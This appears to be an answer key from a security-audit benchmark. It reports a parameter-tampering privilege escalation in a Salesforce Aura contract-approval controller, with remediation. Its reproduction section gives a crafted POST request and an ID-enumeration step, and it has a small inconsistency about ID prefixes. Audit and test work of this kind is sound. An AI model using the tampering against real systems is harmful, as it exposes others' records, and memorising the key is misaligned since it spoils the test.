# Expected Response

## System
- System: VenueCore Ticketing API (Salesforce-Integrated) v4.6.0
- Domain: EVENT MANAGEMENT / TICKETING
- Example ID: SF-0249
- Risk IDs: RISK-SF-249, RISK-SF-250

## Findings

### 1. Pattern 2.4 — Privilege Escalation via Parameter Tampering: `c.ContractController.approveContract` (HAR Primary)

The Aura controller `c.ContractController.approveContract` is vulnerable to Pattern 2.4 (privilege escalation via parameter tampering). The `approveContract` action carries approval-level authority — it is intended only for contracts the authenticated user owns or is authorized to approve. By tampering with `contractId`, an attacker with a standard user session escalates to approving contracts owned by other users, bypassing the authorization boundary between users and contract approval workflows.

The controller runs `without sharing` (RISK-SF-249), bypassing `OWD=Private` on the Contract object, and has no ownership check in SOQL (RISK-SF-250).

**Evidence from HAR:**
- Aura action: `c.ContractController.approveContract`
- Requested `contractId`: `00199C4` — belongs to `OwnerId: "005VICTIM"`
- Response state: `SUCCESS` — victim's contract approved without authorization
- Response includes `SensitiveData__c: "SSN: 000-28-5657"` and `InternalNotes__c: "CONFIDENTIAL: internal review notes"` — SSN exposed
- Session user does not own the returned Contract record

## Reproduction

**Step 1 — Capture baseline Aura request:**
Intercept a legitimate Aura request using Burp Suite or browser DevTools.
Identify `c.ContractController.approveContract` in the `message` POST body.
Record your own `contractId` (e.g., `001YOURCONTRACTID000000`).

**Step 2 — Substitute victim `contractId` — privilege escalation via parameter tampering (primary HAR attack):**
```
POST https://da3099c4.lightning.force.com/aura HTTP/1.1
Authorization: Bearer 00DDA3099C4!ARda3099c4...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DDA3099C4!ARda3099c4...

message={"actions":[{"id":"1;a","descriptor":"c.ContractController.approveContract","callingDescriptor":"UNKNOWN",
"params":{"contractId":"00199C4","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Step 3 — Enumerate adjacent Contract IDs:**
Salesforce Contract IDs use `800` prefix. Increment the last segment to enumerate victim contracts:
```
contractId: 00199C3, 00199C5, 00199C6, ...
```

**Step 4 — Verify privilege escalation:**
**Vulnerable outcome:** Response `state: "SUCCESS"` with:
- `SensitiveData__c: "SSN: 000-28-5657"` — SSN PII exposed (Event Management attendee data)
- `InternalNotes__c: "CONFIDENTIAL: internal review notes"`
- `OwnerId: "005VICTIM"` — approval of another user's contract confirmed
- Privilege escalation: attacker approved a contract they have no authority over

**Secure outcome:** Response `state: "ERROR"` with `INSUFFICIENT_ACCESS` or empty `records` array.

## Remediation
1. **Add `with sharing` to Apex class (RISK-SF-249):**
   ```apex
   public with sharing class ContractController { ... }
   ```
2. **Add ownership filter to SOQL (RISK-SF-250):**
   ```apex
   WHERE Id = :contractId AND OwnerId = :UserInfo.getUserId()
   ```
3. **Server-side role check for approval actions:** `approveContract` must verify the user has Approval Authority permission before executing.
4. **Use `WITH SECURITY_ENFORCED` in all SOQL queries.**
5. **Automated test:** Apex test authenticating as standard user requesting approval of another user's `contractId` — assert `INSUFFICIENT_ACCESS` or empty result.
